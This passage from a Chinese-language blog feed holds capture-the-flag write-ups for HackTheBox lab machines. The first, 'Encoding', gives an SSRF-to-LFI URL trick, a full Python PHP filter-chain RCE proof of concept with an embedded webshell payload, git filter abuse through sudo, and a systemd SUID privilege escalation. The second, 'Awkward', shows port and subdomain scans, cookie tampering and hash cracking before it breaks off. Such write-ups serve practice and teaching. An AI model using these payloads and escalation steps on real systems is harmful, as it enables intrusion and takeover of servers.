class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_status</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$status</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cd /var/www/image &amp;&amp; /usr/bin/git status&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_log</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;&#x27;</span> . <span class="title function_ invoke__">addslashes</span>(<span class="variable">$file</span>) . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$log</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">git_commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$commit</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sudo -u svc /var/www/image/scripts/git-commit.sh&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$commit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出image目录下是存在一个.git的，我们可以使用<a href="https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385">gitdumper.sh</a>下载.git目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gitdumper.sh  http://image.haxtables.htb/.git/ image</span><br></pre></td></tr></table></figure><p>下载下来后，看到actions&#x2F;action_handler.php文件内容如下所示：</p><p><a href="https://pic.imgdb.cn/item/63f9cd55f144a010073235f9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd55f144a010073235f9.jpg"></a></p><p>这里包含了传入的page参数，如果我们可以传入page参数的话，那么这里将会是一处LFI漏洞。可是我们无法直接进入<a href="http://image.haxtables.htb/actions/action/_handler.php%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%95%8C%E9%9D%A2%E4%BC%9A%E8%BF%94%E5%9B%9E403%E3%80%82%E9%82%A3%E4%B9%88%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E8%AF%A5%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8%E5%91%A2%EF%BC%9F">http://image.haxtables.htb/actions/action\_handler.php，因为界面会返回403。那么这里我们该怎么利用呢？</a></p><p>假设我们将$url_path改为如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:a@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;test=</span><br></pre></td></tr></table></figure><p>那么拼接后的url将会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://api.haxtables.htba:a@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&amp;test=/index.php</span><br></pre></td></tr></table></figure><p>我们利用@符号将前面的内容构造成了用户名和密码，真正访问的host变成了image.haxtables.htb，那么就会成功在action_handler.php中传入page参数，实现LFI：</p><p><a href="https://pic.imgdb.cn/item/63f9cd63f144a01007324e9f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd63f144a01007324e9f.jpg"></a></p><p>可是仅有LFI似乎对拿到shell并没有什么帮助，这里推荐一下Zedd师傅发布的一篇文章：<a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a>。从最简单的LFI开始，一步步构造php filter chain从而实现RCE，很棒的文章。</p><p>假设我们有一个php文件，内容如下：</p><p><a href="https://pic.imgdb.cn/item/63f9ce71f144a0100734695f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce71f144a0100734695f.jpg"></a></p><p>利用以下POC可成功RCE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.135.131/include.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;include.php&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f9ceaff144a0100734d847.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ceaff144a0100734d847.jpg"></a></p><p>此处RCE的原理，Zedd师傅的那篇文章已经解释的很清楚了，这里就不再赘述。把上面给出的POC稍微改一下，将php filter chain输出出来，然后url编码作为page参数的值传入，并传入参数名为0的参数，值为要执行命令：</p><p><a href="https://pic.imgdb.cn/item/63f9cd7ef144a010073274c0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd7ef144a010073274c0.jpg"></a></p><p>可以看到命令被成功执行，那反弹个shell吧：</p><p><a href="https://pic.imgdb.cn/item/63f9cdc6f144a0100732f7e1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdc6f144a0100732f7e1.jpg"></a></p><h2 id="get-user"><a href="#get-user" class="headerlink" title="get user"></a>get user</h2><p>执行sudo -l，结果如下：</p><p><a href="https://pic.imgdb.cn/item/63f9cdddf144a01007331ec4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdddf144a01007331ec4.jpg"></a></p><p>可以以svc用户的身份执行&#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.sh脚本，看以下这个脚本内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>通过审计脚本，我们可以滥用ident过滤器来让其执行我们写好的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; .git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/shell.sh</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f9cdeff144a010073345ac.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdeff144a010073345ac.jpg"></a></p><p>user.txt：</p><p><a href="https://pic.imgdb.cn/item/63f9cdfff144a01007336994.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cdfff144a01007336994.jpg"></a></p><h2 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h2><p>sudo -l执行结果：</p><p><a href="https://pic.imgdb.cn/item/63f9ce0af144a01007337dfe.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce0af144a01007337dfe.jpg"></a></p><p>很常见的提权题目，编写&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;priv.service内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">svc@encoding:~$ cat /etc/systemd/system/priv.service</span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=chmod u+s /bin/bash</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>接着执行<code>sudo systemctl restart priv</code>即可以SUID执行&#x2F;bin&#x2F;bash：</p><p><a href="https://pic.imgdb.cn/item/63f9ce17f144a01007339438.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ce17f144a01007339438.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]Awkward Writeup</title>
      <link href="/2023/01/29/htb-awkawrd/"/>
      <url>/2023/01/29/htb-awkawrd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>过年期间，闲来无事，打了一些htb的机子。目标是在年假期间打到Hacker级别（已完成），后面的Pro Hacker等级，有空闲时间再冲吧。</p><p><a href="https://pic.imgdb.cn/item/63d5ed1fface21e9efe84628.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed1fface21e9efe84628.jpg"></a></p><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><p>等级：Medium</p><p>题目地址：<a href="https://app.hackthebox.com/machines/Awkward">https://app.hackthebox.com/machines/Awkward</a></p><p><a href="https://pic.imgdb.cn/item/63d5ed2dface21e9efe85fda.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed2dface21e9efe85fda.jpg"></a></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌─[✗]─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.11.185</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-28 23:50 CST</span><br><span class="line">Nmap scan report for 10.10.11.185 (10.10.11.185)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/28%OT=22%CT=1%CU=37376%PV=Y%DS=2%DC=T%G=Y%TM=63D5449</span><br><span class="line">OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(</span><br><span class="line">OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11</span><br><span class="line">OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(</span><br><span class="line">OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS</span><br><span class="line">OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T</span><br><span class="line">OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=</span><br><span class="line">OS:S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 587/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   260.18 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   260.43 ms 10.10.11.185 (10.10.11.185)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 59.81 seconds</span><br></pre></td></tr></table></figure><h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>可以看到只开放了两个端口：22和80。直接进入80端口，发现网站被重定向到了<code>http://hat-valley.htb/</code>，我们可以将<code>hat-valley.htb</code>写入hosts中。接着利用gobuster爆破一下子域名及目录：</p><p><strong>子域名扫描</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u hat-valley.htb -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:          http://hat-valley.htb</span><br><span class="line">[+] Threads:      50</span><br><span class="line">[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:   gobuster/3.0.1</span><br><span class="line">[+] Timeout:      10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:55:52 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">Found: store.hat-valley.htb (Status: 401) [Size: 188]</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:56:21 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>找到一个子域名<code>store.hat-valley.htb</code>，将其也写入hosts。</p><p>目录爆破：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hat-valley.htb/ -t 50</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://hat-valley.htb/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/28 23:57:12 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/static (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/29 00:17:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>进入<code>http://hat-valley.htb/</code>，查看网页源码，可以找到一个<code>app.js</code>的敏感文件：</p><p><a href="https://pic.imgdb.cn/item/63d5ed3fface21e9efe8819e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed3fface21e9efe8819e.jpg"></a></p><p>发现有一个<code>/hr</code>路径：</p><p><a href="https://pic.imgdb.cn/item/63d5ed53face21e9efe8a490.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed53face21e9efe8a490.jpg"></a></p><p>尝试访问，发现是一个登陆界面：</p><p><a href="https://pic.imgdb.cn/item/63d5ed64face21e9efe8c530.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed64face21e9efe8c530.jpg"></a></p><p>发现Cookie为token&#x3D;guest：</p><p><a href="https://pic.imgdb.cn/item/63d5ed75face21e9efe8e6cb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed75face21e9efe8e6cb.jpg"></a></p><p>尝试将guest修改为admin，刷新页面，登陆成功！</p><p><a href="https://pic.imgdb.cn/item/63d5ed84face21e9efe9090a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed84face21e9efe9090a.jpg"></a></p><p>但是这里似乎没有什么有用的东西。查看network标签页，发现两个可疑的路径：</p><p><a href="https://pic.imgdb.cn/item/63d5ed96face21e9efe92bc6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ed96face21e9efe92bc6.jpg"></a></p><p>在新标签页中打开这两个路径，其中<code>/api/staff-details</code>显示如下：</p><p><a href="https://pic.imgdb.cn/item/63d5eda3face21e9efe9468b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eda3face21e9efe9468b.jpg"></a></p><p><code>/api/store-status?url=&quot;http:%2F%2Fstore.hat-valley.htb&quot;</code>是个空白页。</p><p>在<code>/api/staff-details</code>中提示jwt格式错误。将token设为空，可以看到用户的username及hash加密过的password：</p><p><a href="https://pic.imgdb.cn/item/63d5edb3face21e9efe9634e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edb3face21e9efe9634e.jpg"></a></p><p>试着放在crackstation中爆破一下，结果如下：</p><p><a href="https://pic.imgdb.cn/item/63d5edc0face21e9efe97aa5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5edc0face21e9efe97aa5.jpg"></a></p><p>拿到其中一个人的password，去登陆一下，得到正常用户的jwt:</p><p><a 